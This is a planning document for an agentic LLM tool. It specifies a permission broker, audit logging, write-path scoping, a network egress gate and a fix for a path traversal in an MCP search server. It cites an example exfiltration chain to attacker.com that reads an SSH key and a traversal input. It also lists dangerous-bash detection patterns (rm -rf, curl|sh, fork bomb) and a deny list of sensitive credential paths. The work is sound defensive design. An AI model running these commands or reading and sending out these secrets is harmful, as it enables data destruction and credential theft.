# Epic 21: Agentic-Mode Safeguards

**Epic ID:** E21
**Owner:** Andy
**Status:** Draft
**Priority:** P0
**Completed Stories:** 0/7
**Dependencies:** Epic 12 (Agentic Tool Calling)
**Target Completion:** TBD

---

## Branching Plan

This epic ships entirely on the public mirror. Per-story summary:

| Story | Branch target | Private-only content? | Cross-repo coordination |
|-------|---------------|------------------------|--------------------------|
| 21.1  | public `main` (feature branch → squash PR) | No | None |
| 21.2  | public `main` (feature branch → squash PR) | No | None |
| 21.3  | public `main` (feature branch → squash PR) | No | None |
| 21.4  | public `main` (feature branch → squash PR) | No | None |
| 21.5  | public `main` (feature branch → squash PR) | No | None |
| 21.6  | public `main` (feature branch → squash PR) | No | None |
| 21.7  | public `main` (feature branch → squash PR) | No | None |

**Defaults:** uniform across public and private builds. The repo ships one
set of conservative defaults (prompts ON for all write/execute/network
tools); the maintainer opts out on personal machines via
`~/.config/grounding/permissions.yaml`, which is gitignored / never lives
in the repo. Single source of truth — no public/private drift.

**Cadence:** one squashed commit per story on public `main` as each PR
merges. Do **not** batch-at-epic-close. Public arXiv/Zenodo readers may
already be running `--agentic` against the unguarded build (preprint
submitted 2026-04-12); each safety win should ship as soon as it's
reviewed. 21.6 (docs + release note) lands last so the user-visible
behavior change is announced when the full safeguard set is live.

**Cross-repo impact:**
- `my-agents` repo: none. Agent YAML schema is unchanged. Permissions
  config is a separate file (`.grounding/permissions.yaml`) at the
  project root.
- `Corpora/` Syncthing share: none. Ingestion path is untouched.
- No coordinated commits across repos required.

**Maintainer-local override pattern:** during day-to-day dev work the
maintainer can drop a `~/.config/grounding/permissions.yaml` that loosens
defaults (e.g., adds a personal allowlist, sets `network.mode: allow`
for trusted hosts). That file is per-user, never in any repo, and the
public mirror is unaware of it. This is the **only** sanctioned way to
diverge from shipped defaults.

---

## Overview

`scripts/local_rag.py --agentic` registers nine tools — `bash`,
`read_file`, `write_file`, `edit_file`, `glob`, `grep`, `notebook_edit`,
`web_fetch`, `web_search` — plus `search_corpus`. Today these execute
with **no sandbox, no allowlist, no confirmation, no audit log**.
`BashTool.execute` calls `subprocess.run(shell=True)` directly
(`scripts/filesystem_tools.py:247`); `WriteTool` overwrites any
filesystem path the LLM names (`scripts/filesystem_tools.py:171`);
`WebFetchTool` issues raw `requests.get` to any URL with no host gate
(`scripts/filesystem_tools.py:789`). Local LLMs occasionally
hallucinate destructive commands. Before recommending `--agentic` for
everyday use, we need configurable guardrails that fail safe by default.

This epic adds a **PermissionBroker** that wraps tool dispatch in the
agentic loop. The broker classifies each tool by declared **category**
(`read` / `write` / `execute` / `network`), applies category-specific
default policies (read = allow, write/execute/network = prompt), and
consults a layered config (`project > user > built-in`) for allowlist
overrides. A `--yolo` flag skips prompts for trusted batch runs while
keeping audit logging and dangerous-pattern detection active. Every
tool call is logged as JSONL to `~/.local/state/grounding/agentic-audit.log`.

**Problem Statement:**
- The agentic mode bundles full filesystem and shell access alongside
  raw network egress. There is no defense-in-depth between an LLM
  hallucination and `subprocess.run(shell=True, command="rm -rf /")`.
- Read tools are nominally safe, but their output flows into the LLM
  context and can drive a subsequent `web_fetch` for exfiltration.
  `read_file ~/.ssh/id_rsa → web_fetch("https://attacker.com/?leak=...")`
  is a one-loop attack chain with the current code.
- The grounding-ai project's brand promise is "local-first, no network
  calls." Silently allowing `web_fetch` / `web_search` in agentic mode
  violates that promise; users have no way to enforce airplane-mode.
- There is no audit log. When an agent does something wrong, there is
  no forensic record of what was called, with what arguments, or why.
- Hallucinated destructive commands (`rm -rf`, `sudo`, `dd`,
  `curl|sh`) need a static-analysis check that even `--yolo` can't bypass.

**Solution:**
- Add a `PermissionBroker` (`scripts/permissions.py`) that wraps the
  `tool_executor` plumbed through `run_agentic_loop` (`scripts/agentic.py:288`).
- Each registered tool declares a category in its schema or via a
  registry-side annotation. The broker reads the category and applies a
  category-default policy: `read` → ALLOW, `write` → PROMPT, `execute`
  → PROMPT, `network` → PROMPT.
- A YAML config layer (`.grounding/permissions.yaml` project-local,
  `~/.config/grounding/permissions.yaml` user-global) overrides
  defaults, supplies regex allowlists per tool, and configures network
  mode and write-path roots.
- `--yolo` CLI flag short-circuits PROMPTs to ALLOW for the run but
  preserves audit logging and the dangerous-pattern check.
- Audit log is JSONL to XDG state dir, with secret-aware redaction.
- Write-path scoping defaults to CWD-tree only; sensitive-read deny
  list demotes reads of `.env`, `~/.ssh/*`, etc. from ALLOW to PROMPT.
- Bash dangerous-pattern detection forces a PROMPT on known-destructive
  command shapes regardless of allowlist or `--yolo` state.

---

## Goals

1. Agentic-mode tool dispatch routes through a `PermissionBroker` that
   makes ALLOW / PROMPT / DENY decisions before any tool side effect.
2. Tools self-classify by category (`read` / `write` / `execute` /
   `network`); the broker is category-driven, not name-hardcoded, so
   future tools (including MCP-registered ones) inherit the right
   default by declaring their category.
3. Read-only local-FS tools (`read_file`, `glob`, `grep`,
   `search_corpus`) execute with zero friction by default, except for
   reads of paths matching the sensitive-path deny-list.
4. Write/execute/network tools prompt on the controlling TTY by default,
   with (y / n / session-allow / session-deny) options.
5. Layered YAML config (project > user > built-in) parameterizes every
   policy. Built-in defaults are conservative; project- and user-level
   overrides loosen.
6. `--yolo` CLI flag skips prompts for trusted batch runs. Audit log
   and dangerous-pattern detection remain active.
7. Write-path scoping refuses writes outside CWD-tree by default; users
   extend via `permissions.write_roots`.
8. Network egress is gated as a first-class category, with `mode:
   prompt|allow|deny` and an `allowed_hosts` regex list. `mode: deny`
   restores airplane-mode operation.
9. Every tool call (allowed, denied, prompted) is logged as JSONL to
   `~/.local/state/grounding/agentic-audit.log` with secret-aware
   redaction of args.
10. Dangerous bash patterns (`rm -rf`, `sudo`, `dd`, `curl|sh`,
    fork bombs, etc.) force a PROMPT regardless of allowlist or
    `--yolo` state.
11. All defaults are uniform across public and private builds. No
    differential public/private behavior shipped in the repo.
12. User-visible behavior change is documented in CLAUDE.md, README,
    and `config.example.yaml` before the epic is announced.

---

## Non-Goals

- A true OS-level sandbox (seccomp, AppArmor, gVisor, Docker
  containment). Out of scope; tracked as Tier 2 future work. This epic
  is configurable in-process guardrails, not a security boundary.
- Replacing the bundled `web_fetch` / `web_search` tools with an MCP
  server. Story 21.6 *recommends* the maintainer's `webcrawl-mcp` as
  an alternative; this epic does not bundle it.
- Per-tool execution budgets (e.g., "max 20 writes per session"). The
  existing `--max-iterations` cap is sufficient.
- Sandboxing the `bash` tool's environment (clearing env vars, chroot,
  etc.). Out of scope.
- Cryptographically signing the audit log. Tamper-resistance is a
  future epic.
- Running the broker against tool calls made by Claude Code, the BMAD
  agents, or any caller outside `local_rag.py --agentic`. The MCP
  `search_corpus` server registers `search_corpus` only and is
  unaffected. If a future MCP filesystem server is added, it should
  reuse the broker; this epic does not migrate it.

---

## Architecture

```
User Query
    │
    ▼
┌────────────────────────────────┐
│ run_agentic_loop()             │   scripts/agentic.py:288
│  registry.execute(name, args)  │
└──────────────┬─────────────────┘
               │
               ▼
┌────────────────────────────────┐
│ PermissionBroker               │   NEW: scripts/permissions.py
│  • category lookup             │
│  • config resolve              │
│  • allowlist regex match       │
│  • path-scope check (write)    │
│  • sensitive-path check (read) │
│  • dangerous-pattern check     │
│  • host check (network)        │
│  • audit log entry             │
│  • prompt UX (TTY)             │
└──────────────┬─────────────────┘
               │
               ▼
        ALLOW │ PROMPT(y) │ DENY
               │
               ▼
┌────────────────────────────────┐
│ original tool executor         │   scripts/filesystem_tools.py
│  • BashTool.execute            │
│  • WriteTool.execute           │
│  • etc.                        │
└────────────────────────────────┘
```

### Tool category mapping (default)

| Tool | Category | Default policy |
|------|----------|----------------|
| `read_file`     | `read`    | ALLOW (PROMPT if path on sensitive deny-list) |
| `glob`          | `read`    | ALLOW |
| `grep`          | `read`    | ALLOW |
| `search_corpus` | `read`    | ALLOW |
| `write_file`    | `write`   | PROMPT (DENY if outside write-root) |
| `edit_file`     | `write`   | PROMPT (DENY if outside write-root) |
| `notebook_edit` | `write`   | PROMPT (DENY if outside write-root) |
| `bash`          | `execute` | PROMPT (forced PROMPT on dangerous-pattern match) |
| `web_fetch`     | `network` | per `permissions.network.mode` |
| `web_search`    | `network` | per `permissions.network.mode` |

Categories are declared at registration time. The category is the
broker's only contract with the tool — adding a new tool is one line of
metadata, not a broker code change.

### Configuration resolution order

1. Project-local: `<cwd>/.grounding/permissions.yaml`
2. User-global: `~/.config/grounding/permissions.yaml`
3. Built-in defaults (in `scripts/permissions.py`)

Project overrides user overrides defaults. Each layer is a partial
override (deep-merge), not a wholesale replacement.

### Config schema (preview)

```yaml
permissions:
  defaults:
    read:    allow
    write:   prompt
    execute: prompt
    network: prompt        # alias for permissions.network.mode

  allowlist:
    bash:
      - "^git (status|log|diff|branch)( |$)"
      - "^ls( |$)"
      - "^pwd$"
    write_file: []         # regex on path
    edit_file: []
    notebook_edit: []

  write_roots:
    - "<cwd>"              # placeholder — resolved at startup
    # extend with explicit absolute paths

  sensitive_paths:         # demotes read_file from ALLOW to PROMPT
    - "**/.env"
    - "**/.env.*"
    - "~/.ssh/**"
    - "~/.aws/**"
    - "**/*.pem"
    - "**/*credentials*"

  network:
    mode: prompt           # prompt | allow | deny
    allowed_hosts:
      - "^arxiv\\.org$"
      - "^docs\\.python\\.org$"

  audit:
    path: "~/.local/state/grounding/agentic-audit.log"
    redact_secrets: true
```

### Audit log entry shape

```json
{
  "ts": "2026-04-25T14:32:11.214Z",
  "tool": "bash",
  "category": "execute",
  "args": {"command": "git status", "timeout": 30},
  "decision": "allow",
  "source": "allowlist",
  "flagged": false,
  "exit_status": 0
}
```

`source` ∈ {`default`, `allowlist`, `prompt`, `session_allow`, `yolo`,
`scope_violation`, `network_mode`, `sensitive_path`, `dangerous_pattern`}.

`args` is redacted before logging when `audit.redact_secrets: true`
(default): known token shapes (`sk-...`, `AKIA...`, `Bearer ...`,
`[A-Z_]+=<long>`) replaced with `<redacted>`, then truncated to 1KB.

---

## Stories

### Story 21.1: Permission broker + audit log scaffold

Establish the `PermissionBroker` module, wire it into the agentic loop,
and write per-call JSONL audit entries. No config file yet — defaults
are baked into the module. Categories are read from per-tool metadata
declared at registration time.

**Branch:** public `main` via feature branch.

**Acceptance Criteria:**

1. New module `scripts/permissions.py` exports `PermissionBroker` with
   a single public method `check(tool_name, arguments) -> Decision`,
   where `Decision` is a dataclass `{action: "allow"|"deny", source:
   str, prompt_message: Optional[str], flagged: bool}`.
2. The broker reads tool category from a registration-time annotation.
   `ToolRegistry.register` (`scripts/agentic.py:122`) gains an optional
   `category` keyword arg; existing call sites in
   `scripts/local_rag.py` and `create_all_filesystem_tools` are updated
   to pass categories per the table in the Architecture section.
3. The broker is invoked from `run_agentic_loop`'s tool-dispatch
   branch (`scripts/agentic.py:419-439`) **before** the executor runs.
   On `decision.action == "deny"` the executor is not called and a
   denial message is appended to the tool-result message.
4. Default policy without config: `read` ALLOW, `write`/`execute`/
   `network` PROMPT. Read-only tools run with byte-identical behavior
   to pre-21.1.
5. PROMPT UX: when stdin is a TTY, the broker writes a human-readable
   prompt to stderr showing tool name, category, and a redacted args
   preview, and reads one line from stdin. Accepted responses:
   `y` / `yes` (one-shot allow), `n` / `no` (deny),
   `a` / `all` (session-allow for this tool name),
   `d` / `deny-all` (session-deny for this tool name).
6. When stdin is **not** a TTY, PROMPT decisions resolve to DENY with
   a clear error message pointing the user at `--yolo` and the (future)
   config file.
7. Every `check()` call writes a JSONL entry to
   `~/.local/state/grounding/agentic-audit.log` (XDG state dir, created
   if missing). Entry shape per the Architecture section.
8. Audit log redaction: known secret shapes (`sk-[A-Za-z0-9]{16,}`,
   `AKIA[0-9A-Z]{16}`, `Bearer [A-Za-z0-9._-]+`,
   `[A-Z_]{4,}=[^\s]{12,}`) are replaced with `<redacted>` in any logged
   string field. Args are JSON-truncated to 1KB after redaction.
9. Unit tests cover: each category default policy, TTY vs. non-TTY
   prompt resolution, redaction patterns, audit-log creation when XDG
   dir is absent.
10. Behavior unchanged for non-agentic invocations of `local_rag.py`
    (simple RAG mode bypasses the broker entirely).

### Story 21.2: Permissions config + `--yolo` flag + allowlist

Add the YAML config layer with project > user > built-in precedence,
the `--yolo` CLI flag, and per-tool regex allowlist support. Built-in
defaults stay empty; `config.example.yaml` ships a suggested allowlist
that users opt into by copying.

**Branch:** public `main` via feature branch.

**Acceptance Criteria:**

1. `PermissionBroker` accepts an optional `config: PermissionsConfig`
   constructor arg. `PermissionsConfig` is loaded from
   `<cwd>/.grounding/permissions.yaml` (project) merged over
   `~/.config/grounding/permissions.yaml` (user) merged over baked-in
   defaults. Deep-merge on dict fields, override on scalar fields.
2. Allowlist match: when an incoming args dict contains a key the
   allowlist targets (`bash` matches against `command`; `write_file` /
   `edit_file` / `notebook_edit` match against `path`), and any
   regex in the per-tool list matches, the broker returns ALLOW with
   `source: "allowlist"`.
3. `local_rag.py` gains a `--yolo` flag (default false). When set, the
   broker short-circuits all PROMPT decisions to ALLOW with `source:
   "yolo"`. ALLOW / DENY decisions made for other reasons are
   unchanged. Audit logging continues. Story 21.4's
   dangerous-pattern check is **not** bypassed.
4. `--yolo` is per-invocation only. There is no config setting that
   makes `--yolo` sticky across runs, by design.
5. Session-allow / session-deny responses to a TTY prompt (Story 21.1)
   persist in the broker's in-memory state for the rest of the run only.
6. Built-in default allowlist: empty for every tool. Conservative
   shipping posture.
7. `config.example.yaml` gains a `permissions:` section under the
   existing top-level config (alongside `retrieval:`), with a suggested
   ~10-pattern bash allowlist (`^git (status|log|diff|branch)`,
   `^ls( |$)`, `^pwd$`, `^which `, `^cat <safe-path>`, etc.) commented
   as "uncomment to opt in." No live values.
8. Config-loading errors (malformed YAML, unknown keys, invalid regex)
   exit with a clear error message naming the file and line; the
   broker does not silently fall back to defaults on a malformed
   config.
9. Unit tests cover: layered precedence (project beats user beats
   default), allowlist regex match, `--yolo` short-circuit, malformed
   config rejection, in-memory session persistence.
10. `local_rag.py --help` documents `--yolo` with an explicit warning
    that it skips prompts but not the dangerous-pattern check.

### Story 21.3: Write-path scoping + sensitive-read deny-list

Hard-restrict writes to within `permissions.write_roots` (default:
CWD-tree only). Demote `read_file` of paths matching
`permissions.sensitive_paths` from ALLOW to PROMPT. Both checks live
in the broker; no tool-side changes.

**Branch:** public `main` via feature branch.

**Acceptance Criteria:**

1. The broker resolves an effective write-root list at startup:
   `permissions.write_roots` from config (default `["<cwd>"]`,
   resolved via `Path.cwd()` at agentic-loop start), with `~` and
   `<cwd>` placeholders expanded.
2. For every `write_file` / `edit_file` / `notebook_edit` call, the
   broker resolves the target path (`Path(arg).expanduser().resolve()`)
   and verifies it's a descendant of at least one write-root. On
   failure, decision is DENY with `source: "scope_violation"` —
   PROMPT is **not** offered; the user must extend `write_roots` in
   config to allow.
3. Symlinks are followed during scope resolution; a write target whose
   resolved path escapes write-roots is denied even if the surface
   path appears in-scope.
4. Sensitive-path matching uses the `permissions.sensitive_paths` glob
   list (built-in default per the config schema in the Architecture
   section). `read_file` calls whose resolved path matches any pattern
   demote from ALLOW to PROMPT, with `source: "sensitive_path"` on
   the audit entry.
5. Sensitive-path matching applies to symlink targets, not just the
   surface path passed in.
6. `glob` and `grep` do **not** demote on sensitive paths — these
   tools list/search but don't load full file contents into the LLM
   context. (Note: `grep` does include matching lines; document this
   exposure in 21.6 and revisit if a sensitive-line filter becomes
   warranted.)
7. Audit-log entries for write tools include the resolved target path
   and a `write_root_match: <root>` field on ALLOW or `<none>` on
   scope-violation DENY.
8. Unit tests cover: in-tree write ALLOW, out-of-tree write DENY,
   symlink-escape DENY, sensitive-path PROMPT demotion, glob expansion
   in `sensitive_paths`, `~` expansion in `write_roots`.

### Story 21.4: Dangerous-bash heuristic detection

Static-analysis of `bash` arguments before execution. Match against
known-destructive patterns forces a PROMPT regardless of allowlist or
`--yolo` state. Audit-logged as `flagged: true`.

**Branch:** public `main` via feature branch.

**Acceptance Criteria:**

1. New scanner function `scan_dangerous_bash(command: str) -> Optional[str]`
   in `scripts/permissions.py` returns a human-readable reason on
   match, `None` otherwise. Pattern catalog in module-level constant.
2. Initial pattern catalog (regex-based, case-insensitive on flag
   tokens): `\brm\s+-[rRf]+\b` (recursive/force delete),
   `\bsudo\b`, `\bsu\s+`, `\bchmod\s+-R\b`, `\bchown\s+-R\b`,
   `\bdd\s+if=`, `\bmkfs\b`, `>\s*/dev/(sd|nvme|disk)`,
   `:\s*\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:` (fork bomb),
   `\|\s*(sh|bash)\b` after `curl ` or `wget `,
   `git\s+push\s+(--force|-f)\b`, `--no-verify\b`,
   `\bshred\b`, `\beval\s+["']?\$\(`.
3. When `scan_dangerous_bash` returns a reason and the broker would
   otherwise have returned ALLOW (allowlist match, `--yolo`,
   session-allow), the decision is upgraded to PROMPT with a `⚠
   DANGEROUS COMMAND DETECTED:` banner showing the matched reason.
4. When `scan_dangerous_bash` returns a reason and the broker would
   otherwise have returned PROMPT, the prompt UX shows the same banner
   ahead of the standard prompt text.
5. `--yolo` does **not** skip the dangerous-pattern PROMPT. This is
   the documented exception to `--yolo`'s "skip all prompts" semantics.
6. Audit-log entry sets `flagged: true` on any pattern match,
   regardless of the final decision (ALLOW after explicit `y`, DENY
   after `n`, etc.).
7. Pattern catalog is module-level and overridable via config:
   `permissions.dangerous_patterns: [...]` extends (does not replace)
   the built-in list. Built-in patterns cannot be removed via config —
   they are the floor.
8. Unit tests cover: each built-in pattern positive case, common
   false-positive shapes (`rm node_modules/` without `-rf` should
   *not* match; `rm -rf node_modules/` *does* match and that's intended
   — destructive even if benign in context), `--yolo` interaction,
   user-extension via config.
9. Story 21.6 documents the catalog and the `--yolo` carve-out
   prominently.

### Story 21.5: Network egress gate

Treat `web_fetch` and `web_search` as a first-class category with
`mode: prompt|allow|deny` and an `allowed_hosts` regex list. Default
mode is `prompt`. `mode: deny` restores airplane-mode operation.

**Branch:** public `main` via feature branch.

**Acceptance Criteria:**

1. Network category policy is read from `permissions.network.mode`
   (default `prompt`). Values `prompt`, `allow`, `deny` are accepted;
   any other value is a config-load error per Story 21.2 AC 8.
2. `mode: deny`: the broker returns DENY for every `web_fetch` /
   `web_search` call with `source: "network_mode"` and a message
   pointing the user at the config knob. The tools remain registered
   so the LLM can see them in the tool list (and learn from the
   denial), but they never execute.
3. `mode: allow`: the broker returns ALLOW. Audit logging still
   applies.
4. `mode: prompt`: the broker checks `permissions.network.allowed_hosts`
   first. For `web_fetch`, the URL host (`urllib.parse.urlparse(url).hostname`)
   is matched against each regex; first match yields ALLOW with
   `source: "allowlist"`. For `web_search`, the destination host is
   the search backend (DuckDuckGo by default); the broker treats
   `web_search` as a single conceptual host (`duckduckgo.com`) for
   allowlist purposes. No allowlist match → PROMPT.
5. Session-allow / session-deny in TTY prompts apply per-host for
   `web_fetch` (so a `y` on `arxiv.org` only allows further
   `arxiv.org` fetches in the run, not arbitrary hosts).
6. `--yolo` short-circuits the PROMPT to ALLOW (consistent with other
   categories). It does **not** override `mode: deny` — `deny` is a
   hard floor.
7. Audit-log entries for network tools include `host: <hostname>` and
   `url: <url>` (URL is redaction-passed through Story 21.1's
   redactor; query-string secret patterns are stripped).
8. The broker does not perform DNS resolution, IP-range checking, or
   TLS interception — host gating is at the URL-parse level only.
   A documented limitation.
9. Unit tests cover: each `mode` value, allowlist regex match per host,
   per-host session-allow scoping, query-string redaction in audit,
   `--yolo`-vs-`mode: deny` precedence.
10. `local_rag.py --help` notes that network access defaults to
    PROMPT and that `permissions.network.mode: deny` restores
    airplane-mode operation.

### Story 21.6: Documentation + example config + release note + webcrawl-mcp recommendation

Documentation-only PR. Updates CLAUDE.md, README, `config.example.yaml`,
and `--agentic` help text. Coordinates the public-mirror release note.
Recommends the maintainer's `webcrawl-mcp` as a higher-quality
alternative to the bundled `web_fetch` / `web_search` for users who
want richer web access — non-binding, docs-only mention.

**Branch:** public `main` via feature branch.

**Acceptance Criteria:**

1. CLAUDE.md gains a top-level "Agentic Mode Safeguards" section
   covering: tool categories, default policies, the four config knobs
   (allowlist, write_roots, sensitive_paths, network.mode), the
   `--yolo` flag and its dangerous-pattern carve-out, and audit-log
   location.
2. README gains a "Safety model" section in the agentic-mode area
   summarizing what runs without prompts, what asks, what's blocked,
   and how to opt out via config.
3. `config.example.yaml` gains a `permissions:` block with the full
   schema from the Architecture section, fully commented. Suggested
   bash allowlist patterns are present but commented-out so opting in
   is a deliberate copy.
4. `local_rag.py --help` text for `--agentic` and `--yolo` references
   the safety doc by anchor.
5. README and CLAUDE.md include a "Recommended: pluggable web tools"
   subsection noting that the bundled `web_fetch` / `web_search` are
   minimal (raw `requests.get`, DuckDuckGo HTML scraping) and that
   users wanting structured extraction, robots.txt respect, or rate
   limiting may register an MCP server with `category: network`
   instead. The maintainer's `webcrawl-mcp` (public OSS) is named as
   a reference implementation, with a one-line setup example showing
   how to register it via the standard MCP server config so the
   network egress gate from Story 21.5 applies uniformly.
6. Public-mirror release note (CHANGELOG entry or release-note draft,
   per repo convention) calls out: (a) defaults changed — agentic mode
   now prompts by default; (b) `--yolo` flag for prior behavior; (c)
   audit-log location; (d) link to the safety doc.
7. No code changes in this PR. Only `*.md`, `config.example.yaml`,
   and `local_rag.py` argparse help-text edits.
8. PR description includes a one-paragraph announcement copy suitable
   for posting to the public-mirror release notes / arXiv-readers
   channel.

### Story 21.7: MCP `search_corpus` input validation + path-traversal hardening

Source: `docs/qa/assessments/load-bearing-review-20260612.md` finding R2.

The MCP corpus-search server is a tool surface exposed to a model-driven
caller, so its arguments are untrusted input — the same threat model this
epic addresses for the agentic loop's tools. Two caller-controlled
arguments are joined into filesystem paths without validation, yielding
arbitrary-file disclosure in tool output. This story closes that hole;
it fits Epic 21's defense-in-depth charter (untrusted tool input → guarded
dispatch) even though the surface is the MCP server rather than the
in-process agentic loop.

**The defect:** `agent` is joined unvalidated as `embeddings_dir /
agent_name` (`mcp_servers/corpus_search/server.py:78`). `..` traverses;
an absolute value replaces the base entirely. So
`agent="../../../../etc/..."` (or an absolute path) loads an arbitrary
`_embeddings.faiss` + `_chunk_map.json` pair from anywhere readable. A
crafted chunk map with absolute `file_path` entries then makes
`read_chunk` (`server.py:109`, `corpus_dir / chunk_path` — absolute RHS
wins in pathlib) read and return **arbitrary files** in the tool output.
Even without planted artifacts, traversal plus the `FileNotFoundError`
echo (`server.py:470-475`) enables filesystem path probing. The numeric
arguments (`top_k`, `rerank_pool_size`, hybrid pool sizes) are also
coerced before the error-handling `try` and lack bound/type checks
(finding R6), so malformed values raise out of `call_tool` instead of
returning a graceful error.

**Branch:** public `main` via feature branch.

**Acceptance Criteria:**

1. The `agent` argument is validated before any path join: it must match
   `^[a-z0-9][a-z0-9-]*$` (no `..`, no `/`, no leading dash, no absolute
   paths), or — stronger and preferred — must be a member of
   `list_available_agents()`. A failing value returns a graceful
   `TextContent` error naming the constraint, not a traceback and not a
   path-probing signal.
2. `read_chunk` rejects `file_path` / chunk-path entries that are absolute
   or contain `..` before joining with `corpus_dir`. A chunk map with a
   malicious absolute `file_path` cannot cause a read outside the corpus
   directory tree. The resolved path is confirmed to be within
   `corpus_dir` (resolve + `is_relative_to`-style check) before reading.
3. The `FileNotFoundError` / error echo does not leak the attempted
   absolute filesystem path back to the caller; error messages are
   sanitized to avoid use as a path-probing oracle.
4. Numeric arguments (`top_k`, `rerank_pool_size`, `hybrid_pool_size`,
   `hybrid_k_rrf`) are validated with type + bound checks (and
   `RerankConfig.validate()` / `HybridConfig.validate()` invoked) inside
   the request's error-handling envelope, so a malformed value returns a
   graceful `TextContent` error rather than raising out of `call_tool`.
   `top_k` gains a lower bound (≥ 1) in addition to the existing upper
   clamp.
5. Tests cover: traversal `agent` value rejected; absolute `agent` value
   rejected; unknown agent rejected; a chunk map with an absolute/`..`
   `file_path` does not read outside the corpus tree; malformed numeric
   args return graceful errors; a legitimate agent + query still works
   unchanged.
6. Legitimate behavior (valid agent name, normal queries, all existing
   rerank/hybrid arguments) is unchanged. This is additive validation, not
   a behavior change for well-formed calls.
7. Coordinate with the broker model: if Epic 21's `PermissionBroker`
   lands first, note whether MCP-surface validation should eventually
   route through a shared validation helper. For now it's a self-contained
   guard in the MCP server (the broker guards the in-process loop; this
   guards the MCP entry point — different processes).

**Status:** Draft

---

## Risks

1. **TTY-prompt UX in the wrong contexts.** `local_rag.py` is sometimes
   piped or run from cron. Story 21.1 handles non-TTY via deny-with-
   message, but users may still hit surprises. Mitigation: explicit
   docs in 21.6, clear error message naming `--yolo` and the config.
2. **False positives on dangerous-pattern detection (Story 21.4).**
   Legit `rm -rf node_modules/` will prompt every time. Mitigation:
   PROMPT, not DENY — friction, not blockage. Document the carve-out
   prominently.
3. **Audit log grows unbounded.** No rotation in this epic. Mitigation:
   document path; users can rotate with logrotate. A future epic may
   add native rotation.
4. **`--yolo` muscle memory.** Users who batch-run `--yolo` regularly
   may forget it's on. Per-invocation-only (no config setting) is the
   primary mitigation; the audit log is the secondary. Explicitly
   documented in 21.2 and 21.6.
5. **Session-allow scope confusion.** A user who answers `a` (all)
   to a `bash` prompt allows arbitrary subsequent bash for the run.
   Mitigation: clear prompt copy ("allow all `bash` calls for the
   rest of this run? [y/n/a/d]"), audit-log shows `source:
   session_allow` so it's visible post-hoc.
6. **Config-loading error on first run.** A typo in
   `~/.config/grounding/permissions.yaml` would block all agentic
   runs. Mitigation: clear error message naming file and line; users
   can move the file aside and rerun. We do not silently ignore
   malformed config — that's a worse failure mode (security control
   becomes invisible).
7. **Symlink-traversal escapes from write-root scoping.** Story 21.3
   AC 3 follows symlinks during resolution; if the test suite misses
   an edge case (e.g., directory symlinks created post-resolution),
   a TOCTOU race could exist. Mitigation: resolve once at decision
   time, accept the small race window — full TOCTOU defense requires
   OS-level sandboxing, which is out of scope.

---

## Open Questions / Future Work

**Open at draft time:** none. All design decisions resolved during
draft review (2026-04-25).

**Future work (out of scope):**

- True OS-level sandbox for `bash` (seccomp, AppArmor, Docker) —
  separate epic; this epic is in-process guardrails.
- Audit-log rotation, signing, or remote shipping.
- Migration of MCP filesystem servers (if/when added) to the broker.
  The broker is reusable; the migration is a future PR.
- Per-tool execution budgets within a session (`max_writes`, etc.).
- Automatic "first-run learns and proposes" allowlist generation.
- Cross-machine policy distribution (if this ever runs on shared
  ingestion servers).
- Tamper-evident audit log (signed JSONL or append-only journal).

---

## References

- `scripts/agentic.py:288` — `run_agentic_loop()` entry point; broker
  hook lands at the tool-dispatch branch around line 419.
- `scripts/agentic.py:122` — `ToolRegistry.register()`; gains a
  `category` arg in 21.1.
- `scripts/filesystem_tools.py:247` — `BashTool.execute`; the
  unsandboxed `subprocess.run(shell=True)` call.
- `scripts/filesystem_tools.py:171` — `WriteTool.execute`; the
  unconstrained file write.
- `scripts/filesystem_tools.py:789` — `WebFetchTool.execute`; the
  unconstrained `requests.get`.
- `scripts/local_rag.py:866` — `--agentic` flag; `--yolo` flag added
  alongside in 21.2.
- Epic 12 (`docs/epics/epic-12-agentic-tool-calling-v02.md`) — the
  agentic-mode foundation this epic safeguards.
